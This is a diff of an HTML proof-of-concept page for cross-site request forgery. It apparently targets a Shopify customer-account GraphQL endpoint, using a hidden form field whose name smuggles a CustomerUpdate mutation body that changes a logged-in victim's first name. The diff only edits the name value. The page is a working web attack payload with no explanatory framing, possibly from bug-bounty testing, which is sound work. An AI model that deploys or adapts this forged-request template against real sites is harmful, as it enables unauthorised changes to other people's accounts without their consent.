@@ -1,7 +1,7 @@
 <html>
 	<body>
 		<form method="POST" action="https://shopify.com/1462730863/account/customer/api/unstable/graphql?operation=CustomerUpdate">
-			<input type="hidden" name="{"operationName":"CustomerUpdate","variables":{"input":{"firstName":"VARSHINIdup","lastName":"C"}},"query":"mutation CustomerUpdate($input: CustomerUpdateInput!) {\n  customerUpdate(input: $input) {\n    customer {\n      id\n      firstName\n      lastName\n      emailAddress {\n        emailAddress\n        __typename\n      }\n      phoneNumber {\n        phoneNumber\n        __typename\n      }\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}"}" value="undefined"/>
+			<input type="hidden" name="{"operationName":"CustomerUpdate","variables":{"input":{"firstName":"VARSHINIdupdupp","lastName":"C"}},"query":"mutation CustomerUpdate($input: CustomerUpdateInput!) {\n  customerUpdate(input: $input) {\n    customer {\n      id\n      firstName\n      lastName\n      emailAddress {\n        emailAddress\n        __typename\n      }\n      phoneNumber {\n        phoneNumber\n        __typename\n      }\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}"}" value="undefined"/>
 			<input type="submit" value="Submit">
 		</form>
 	</body>
